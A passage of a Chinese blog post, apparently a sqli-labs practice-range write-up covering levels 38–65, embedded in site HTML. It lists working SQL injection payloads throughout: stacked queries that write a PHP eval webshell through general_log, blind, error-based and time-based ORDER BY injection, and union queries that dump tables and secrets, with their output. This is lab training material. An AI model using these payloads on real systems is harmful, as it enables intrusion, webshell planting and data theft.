+<li>  是否尝试load或者写入文件？当然可以，不过目前受限于secure_file_priv</li>
+<li>   通过开始日志文件log来写入shell<code>id=1&#39;;set global general_log=on;set global general_log_file=&#39;/tmp/tony.php&#39;;select &#39;&lt;?php eval($_POST[tony]) ?&gt;&#39;;%23</code>（尝试成功）</li>
+<li>   增加用户：<code>?id=1&#39;;insert into users(id,username,password) values (&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;)--+</code>删delete和改alter都这个差不多，这种增删改比较通用</li>
+</ul>
+<h3 id="less39之int型注入"><a href="#less39之int型注入" class="headerlink" title="less39之int型注入"></a>less39之int型注入</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>同上，基本没变，只是去掉了单引号而已</p>
+<h3 id="less40之单引号-括号"><a href="#less40之单引号-括号" class="headerlink" title="less40之单引号+括号"></a>less40之单引号+括号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>同上，基本没变，只是单引号+括号而已</p>
+<h3 id="less41之int型-禁止了报错"><a href="#less41之int型-禁止了报错" class="headerlink" title="less41之int型_禁止了报错"></a>less41之int型_禁止了报错</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br>没有了这个语句<code>print_r(mysqli_error($con1));</code></p>
+</blockquote>
+<p>还是把前面的可以一把梭哈，只不过没有了基于报错的注入而已</p>
+<h3 id="less42之单引号——post"><a href="#less42之单引号——post" class="headerlink" title="less42之单引号——post"></a>less42之单引号——post</h3><blockquote>
+<p><code> $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</code><br><code>$password = $_POST[&quot;login_password&quot;];</code><br><code>$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code><br><code>@mysqli_multi_query($con1, $sql)</code></p>
+</blockquote>
+<p>用了mysqli_real_escape过滤username</p>
+<ul>
+<li>  宽字节注入逃逸单引号</li>
+<li>  上面堆叠注入的姿势，基本都可以在password这里再次尝试，因为password没被过滤</li>
+</ul>
+<h3 id="less43之单引号-括号——post"><a href="#less43之单引号-括号——post" class="headerlink" title="less43之单引号+括号——post"></a>less43之单引号+括号——post</h3><blockquote>
+<p><code>$sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;;</code></p>
+</blockquote>
+<p>单引号+括号，没意思</p>
+<h3 id="less44之单引号-禁止了报错——post"><a href="#less44之单引号-禁止了报错——post" class="headerlink" title="less44之单引号+禁止了报错——post"></a>less44之单引号+禁止了报错——post</h3><blockquote>
+<p><code>$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code><br>没有了这个语句<code>print_r(mysqli_error($con1));</code></p>
+</blockquote>
+<p>同上 没意思</p>
+<h3 id="less45之单引号-括号-禁止报错——post"><a href="#less45之单引号-括号-禁止报错——post" class="headerlink" title="less45之单引号+括号+禁止报错——post"></a>less45之单引号+括号+禁止报错——post</h3><p>同43，不过没有了报错信息，没意思</p>
+<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><h3 id="less46之int型"><a href="#less46之int型" class="headerlink" title="less46之int型"></a>less46之int型</h3><blockquote>
+<p><code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code></p>
+</blockquote>
+<ul>
+<li>  基于bool：<code>sort=rand(ascii(left(database(),1))=115)</code></li>
+<li>  基于报错：<code>sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))limit 0,1)</code></li>
+<li>  基于时间：<code>If(ascii(substr(database(),1,1))=115,0,sleep (5))</code><h3 id="less47之单引号"><a href="#less47之单引号" class="headerlink" title="less47之单引号"></a>less47之单引号</h3><blockquote>
+<p><code>$sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;</code></p>
+</blockquote>
+</li>
+</ul>
+<p>因为order by后面只能跟int型，加了引号之后，引号里面无论是什么都无济于事，都不会改变显示结果<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611234830.png" srcset="/img/loading.gif" lazyload alt="20190611234830.png"><br>但是天无绝人之路</p>
+<ul>
+<li>  基于报错，和上面一样<code>sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))limit 0,1)</code></li>
+<li>  基于时间延迟</li>
+</ul>
+<p>二者都能执行的核心在于id里面的sql语句会被执行<br><strong>瞬间打脸</strong><br>我想的这两个想法都是错的，因为Id两边的单引号存在，id里面的sql语句并不会执行<br>也就说基于报错，基于时间延迟，也得闭合’ 然后搭配and使用<br><strong>看了下答案</strong><br>后面可以形成闭合啊，如果id没有被waf处理，可以在id这里构造引号与前面的引号形成闭合<br>比如<code>?sort=1%27and%20rand(ascii(left(database(),1))=116)--+</code>，进入数据库执行就是<code>SELECT * FROM users ORDER BY &#39;1&#39;and rand(ascii(left(database(),1))=116)-- &#39;</code>，与id后面的引号闭合之后 and 的后面的语句就不会受到引号限制，故而可以执行<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611235403.png" srcset="/img/loading.gif" lazyload alt="20190611235403.png"><br>同时这个截图也想告诉大家：受限于语法结构问题，order by后面不能跟union，只能老老实实的and</p>
+<p><strong>综上真正的解题思路</strong><br>在less46的基础上构造语句闭合单引号即可</p>
+<ul>
+<li>  基于bool：<code>sort=1&#39; and rand(ascii(left(database(),1))=115)--+</code></li>
+<li>  基于报错：<code>sort=1&#39; and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))limit 0,1)--+</code></li>
+<li>  基于时间：<code>1&#39; and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+</code></li>
+</ul>
+<p><strong>最后一次被打脸</strong><br>我尝试下bool的报错，他是存在问题的，不能以这种方式正常注入（当然也通过测试，发现一个有意思的现象）<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-06-12 00-22.gif" srcset="/img/loading.gif" lazyload/><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-06-12 00-24.gif" srcset="/img/loading.gif" lazyload/><br>上面那个图是less47的，下面是less46的<br>对于less47，反复执行的话，结果就那三样不断地切换<br>对于less46，反复执行的话，结果始终唯一且不同<br>就因为多了一个sort=’1’ and，就导致结果这样反复原因暂时不打算深究，打住即可<br><strong>目前定棺结论：</strong><br>针对含单引号的Order by的地方优先报错，如果报错信息被注释则尝试时间延迟，最后在考虑rand函数的报错，rand太不稳定了《天书》里面失败了，我的环境也失败，也就说明这是个共性问题了<br>而没有单引号 int型的order By 则可以放心大胆的使用order by。虽然非order by 0 或者order by 1的结果，毕竟rand返回值不可能只有0 1两个返回值，但是唯一可以保证的是rand(true)和rand(false)两个返回的排序结果是唯一且不同的</p>
+<h3 id="less48之int型-盲注"><a href="#less48之int型-盲注" class="headerlink" title="less48之int型_盲注"></a>less48之int型_盲注</h3><blockquote>
+<p><code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code></p>
+</blockquote>
+<p>和less46的区别在于注释掉了报错信息，无非不能执行报错注入而已</p>
+<h3 id="less49之string型-盲注"><a href="#less49之string型-盲注" class="headerlink" title="less49之string型_盲注"></a>less49之string型_盲注</h3><blockquote>
+<p><code>$sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;</code></p>
+</blockquote>
+<p>和less47的区别在于注释掉了报错信息，无非不能执行报错注入而已</p>
+<h2 id="order-by-堆叠注入"><a href="#order-by-堆叠注入" class="headerlink" title="order by+堆叠注入"></a>order by+堆叠注入</h2><h3 id="less50之int型"><a href="#less50之int型" class="headerlink" title="less50之int型"></a>less50之int型</h3><p>和less46相比，使用了mysqli_multi_query()函数来执行sql命令<br>因此除了使用46的那些方法，还可以使用less39构造堆叠注入的方法</p>
+<h3 id="less51之string型"><a href="#less51之string型" class="headerlink" title="less51之string型"></a>less51之string型</h3><p>和less47相比，使用了mysqli_multi_query()函数来执行sql命令<br>因此除了使用47的那些方法，还可以使用less38构造堆叠注入的方法</p>
+<h3 id="less52之int型-盲注"><a href="#less52之int型-盲注" class="headerlink" title="less52之int型_盲注"></a>less52之int型_盲注</h3><p>和 less50 是一样的<br>只是这里的 mysql 错误不会在前台显示,但是对于 stacked injection 是一样的利用方式</p>
+<h3 id="less53之string型-盲注"><a href="#less53之string型-盲注" class="headerlink" title="less53之string型_盲注"></a>less53之string型_盲注</h3><p>和 less51 是一样的<br>只是这里的 mysql 错误不会在前台显示,但是对于 stacked injection 是一样的利用方式</p>
+<hr>
+<h1 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h1><p>限制了次数，核心在于想让我们去优化我们的请求代码！</p>
+<h2 id="限制查询次数"><a href="#限制查询次数" class="headerlink" title="限制查询次数"></a>限制查询次数</h2><h3 id="less54之单引号"><a href="#less54之单引号" class="headerlink" title="less54之单引号"></a>less54之单引号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>接合information表+采用联合注入的爆库版本即可</p>
+<ul>
+<li>   查表：<code>id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;--+</code>===》<code>40S9NXOMUW</code></li>
+<li>   查字段：<code>?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;40S9NXOMUW&#39;--+</code>===》<code>id,sessid,secret_L3Q4,tryy</code></li>
+<li>   查内容：<code>?id=-1&#39;union select 1,2,group_concat(sessid,secret_L3Q4) from 40S9NXOMUW--+</code>===》<code>25824988925b5fd75ef84e8202957b74TkM2Olgza5JdRAJmbAW7AtmZ</code><h3 id="less55之整型-括号"><a href="#less55之整型-括号" class="headerlink" title="less55之整型+括号"></a>less55之整型+括号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h3 id="less56之单引号-括号"><a href="#less56之单引号-括号" class="headerlink" title="less56之单引号+括号"></a>less56之单引号+括号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h3 id="less57之双引号-括号"><a href="#less57之双引号-括号" class="headerlink" title="less57之双引号+括号"></a>less57之双引号+括号</h3><blockquote>
+<p><code>$id= &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h2 id="限制查询次数-禁止结果显示"><a href="#限制查询次数-禁止结果显示" class="headerlink" title="限制查询次数+禁止结果显示"></a>限制查询次数+禁止结果显示</h2><h3 id="less58之单引号"><a href="#less58之单引号" class="headerlink" title="less58之单引号"></a>less58之单引号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+</li>
+</ul>
+<p>基于报错+information表</p>
+<ul>
+<li>   查表：<code>?id=-1&#39;union select 1,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),0x7e),1)--+</code>===&gt;<code>XPATH syntax error: &#39;~J68QHCWZVP~&#39;</code></li>
+<li>   查字段：<code>?id=-1&#39;union select 1,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;J68QHCWZVP&#39;),0x7e),1)--+</code>===》<code>XPATH syntax error: &#39;~id,sessid,secret_9YBW,tryy~&#39;</code></li>
+<li>   查内容：<code>id=-1&#39;union select 1,1,updatexml(1,concat(0x7e,(select group_concat(secret_9YBW) from J68QHCWZVP),0x7e),1)--+</code>====》<code>XPATH syntax error: &#39;~VckmCqkD23dokvvfaBaYfncI~&#39;</code><blockquote>
+<p>注意这里是基于报错，而updatexml的第二个参数只需要一个，而非三个<br>此时就要把54的payload改一下，54那个为了和前面的列数相匹配，多了select 1,2,xxx，如果58这里还这样会报错<code>Operand should contain 1 column(s)</code>，把1,2删掉，直接select groupxxx即可</p>
+</blockquote>
+<h3 id="less59之整型"><a href="#less59之整型" class="headerlink" title="less59之整型"></a>less59之整型</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h3 id="less60之双引号-括号"><a href="#less60之双引号-括号" class="headerlink" title="less60之双引号+括号"></a>less60之双引号+括号</h3><blockquote>
+<p><code>$id = &#39;(&quot;&#39;.$id.&#39;&quot;)&#39;;</code><br><code>$sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h3 id="less61之单引号-双括号"><a href="#less61之单引号-双括号" class="headerlink" title="less61之单引号+双括号"></a>less61之单引号+双括号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h2 id="限制查询次数-禁止结果显示-禁止报错信息"><a href="#限制查询次数-禁止结果显示-禁止报错信息" class="headerlink" title="限制查询次数+禁止结果显示+禁止报错信息"></a>限制查询次数+禁止结果显示+禁止报错信息</h2><h3 id="less62之单引号-括号"><a href="#less62之单引号-括号" class="headerlink" title="less62之单引号+括号"></a>less62之单引号+括号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+</li>
+</ul>
+<p>他这里限制了130次，我觉得基本不可能….<br>这里感觉就只能就像最初的爆破脚本的爆破</p>
+<ul>
+<li><p>   直接构造<code>?id=1&#39;)and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=74--+</code><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612223744.png" srcset="/img/loading.gif" lazyload alt="20190612223744.png"></p>
+<blockquote>
+<p>当然我这个是开了上帝视角，用Mysql命令行尝试过，这里只是想表示他可以正常执行</p>
+</blockquote>
+</li>
+<li><p> 基于报错<code>?id=1&#39;)and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=79,0,exp(710))--+</code><br>   <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612223956.png" srcset="/img/loading.gif" lazyload alt="20190612223956.png"></p>
+</li>
+<li><p>   基于时间<code>?id=1&#39;)and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=79,0,sleep(10))--+</code></p>
+<h3 id="less63之单引号"><a href="#less63之单引号" class="headerlink" title="less63之单引号"></a>less63之单引号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h3 id="less64之双括号"><a href="#less64之双括号" class="headerlink" title="less64之双括号"></a>less64之双括号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h3 id="less65之双引号-括号"><a href="#less65之双引号-括号" class="headerlink" title="less65之双引号+括号"></a>less65之双引号+括号</h3><blockquote>
+<p><code>$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<h3 id="less65-75"><a href="#less65-75" class="headerlink" title="less65~75"></a>less65~75</h3><p>然而源代码里面并没有</p>
+</li>
+</ul>
+<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>能明注最好，但是基本很少<br>盲注能报错注入，肯定优先报错注入<br>在考虑布尔爆破，布尔又分普通直接爆，配合报错爆，配合时间爆。肯定优先第一中，因为最直接<br>但是很多情况是属于，你结果集是否为空，都返回相同的内容，比如CISCN的全宇宙最简单sql那道题。所以就需要配合报错或者配合时间报错，由于时间的费时以及不确定性，因此优先配合报错爆</p>
+<p>明注&gt;盲注<br>    &gt;报错注入&gt;布尔注入<br>            &gt;直接注入&gt;配合报错注入&gt;配合时间注入</p>
+<p>联合注入 即union注入，要么能注入出结果，要么基于报错明主</p>
+<p>核心在于猜解他背后的sql语句的结构，以及waf措施，从而进行闭合绕过bypass，然后进行注入<br>不拘泥于一个参数username，可能还是password<br>不拘泥于–+ # 还有/***/<br>不拘泥于select 还有updata insert delete，而这个则需要掌握他的结构，灵活利用union and等是否合法<br>思维不要有局限性</p>
+<h1 id="代办"><a href="#代办" class="headerlink" title="代办"></a>代办</h1><p>写个暴库的jio本试一试 尤其是盲住开始</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+<p>基于advanced 学习sqlmap的tamper使用<br>limit的注入<br>lines terminated<br>内联注释<br>less 26 27的 <code>\/\*</code> <code>\[ +]\</code>深入php底层探索</p>
+
+                            </div>
+                            
+                                <p class="note note-info">
+                                    
+                                                    本文最后更新于：
+                                                        2022年6月7日 晚上
+                                                            
+                                </p>
+                                
+                                    <hr>
+                                    <div>
+                                        <div class="post-metas mb-3">
+                                            
+                                                <div class="post-meta mr-3">
+                                                    <i class="iconfont icon-category"></i>
+                                                    
+                                                        <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                                            渗透测试
+                                                        </a>
+                                                        
+                                                </div>
+                                                
+                                                    
+                                                        <div class="post-meta">
+                                                            <i class="iconfont icon-tags"></i>
+                                                            
+                                                                <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                                                    渗透测试
+                                                                </a>
+                                                                
+                                                                <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                                                    靶场
+                                                                </a>
+                                                                
+                                                                <a class="hover-with-bg" href="/tags/sqli/">
+                                                                    sqli
+                                                                </a>
+                                                                
+                                                        </div>
+                                                        
+                                        </div>
+                                        
+                                            <p class="note note-warning">
+                                                
+                                                            本博客所有文章欢迎转载 ，但希望转载时能注明出处！ </br>关于文章，如有疑问，欢迎讨论！Email:corp0ra1@qq.com </br>如果图片无法显示:https://corp0ra1.github.io/common/imageLoad.html
+                                                                
+                                            </p>
+                                            
+                                                
+                                                    <div class="post-prevnext">
+                                                        <article class="post-prev col-6">
+                                                            
+                                                                
+                                                                    <a href="/2019/06/18/%5Bold%5Dsqli-labs%E9%9D%B6%E5%9C%BA-%E6%8A%80%E8%83%BD%E7%82%B9%E8%A1%A5%E5%85%85/">
+                                                                        <i class="iconfont icon-arrowleft"></i>
+                                                                        <span class="hidden-mobile">sqli-labs靶场通关记录</span>
+                                                                        <span class="visible-mobile">上一篇</span>
+                                                                    </a>
+                                                                    
+                                                        </article>
+                                                        <article class="post-next col-6">
+                                                            
+                                                                
+                                                                    <a href="/2019/05/15/%5Bold%5DCTF%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+                                                                        <span class="hidden-mobile">CTF引发的对报错注入的深入学习</span>
+                                                                        <span class="visible-mobile">下一篇</span>
+                                                                        <i class="iconfont icon-arrowright"></i>
+                                                                    </a>
+                                                                    
+                                                        </article>
+                                                    </div>
+                                                    
+                                    </div>
+
+                                    
+                        </article>
+                    </div>
+                </div>
+            </div>
+            
+                <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+                    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+                </div>
+                
+        </div>
+    </div>
+
+    <!-- Custom -->
+    
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <div> <div class="copyright">©2020 - 2021 By Corp0ra1</div> </div> <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> &nbsp;|&nbsp; <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> &nbsp;|&nbsp; <a href="https://github.com/jsdelivr/jsdelivr" target="_blank" rel="nofollow noopener"><span>jsDelivr</span></a> </div> 
+  </div>
+  <!--添加运行时间-->
+<div id="sitetime"></div>
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* 
+      Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+      year - 作为date对象的年份，为4位年份值
+      month - 0-11之间的整数，做为date对象的月份
+      day - 1-31之间的整数，做为date对象的天数
+      hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+      minutes - 0-59之间的整数，做为date对象的分钟数
+      seconds - 0-59之间的整数，做为date对象的秒数
+      microseconds - 0-999之间的整数，做为date对象的毫秒数
+     */
+        var t1 = Date.UTC(2021, 05, 01, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "很高兴遇到你，我已经在此等候了你 " + /*diffYears+" 年 "+*/ diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }
+    siteTime();
+</script>
+
+    <div class="statistics">
+        
+            
+
+                
+                                                
+                                                    <!-- 不蒜子统计PV -->
+                                                    <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            
+            <span id="busuanzi_value_site_pv"></span>
+                                                     次
+                                                        &nbsp; <span class="iconfont icon-love"></span></span>
+                                                        
+
+                                                            
+
+                                                                <!-- 不蒜子统计UV -->
+                                                                <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            
+            <span id="busuanzi_value_site_uv"></span>
+                                                                 人
+                                                                    </span>
+                                                                    
+                                                                        
+    </div>
+    
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        <!-- Baidu Analytics -->
+        <script defer>
+            var _hmt = _hmt || [];
+            (function() {
+                var hm = document.createElement("script");
+                hm.src = "https://hm.baidu.com/hm.js?a1a4ccab78dfa522556928ac810fa739";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();
+        </script>
+        
+
+            
+                <!-- Google Analytics -->
+                <!-- <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-4X9XV0H0D5', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script> -->
+                <!-- Global site tag (gtag.js) - Google Analytics -->
+                <script async src="https://www.googletagmanager.com/gtag/js?G-4X9XV0H0D5"></script>
+                <script>
+                    window.dataLayer = window.dataLayer || [];
+
+                    function gtag() {
+                        dataLayer.push(arguments);
+                    }
+                    gtag('js', new Date());
+
+                    gtag('config', 'G-4X9XV0H0D5');
+                </script>
+                
+
+                    
+
+                            
+
+                                    
+
+                                            
+                                                    
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
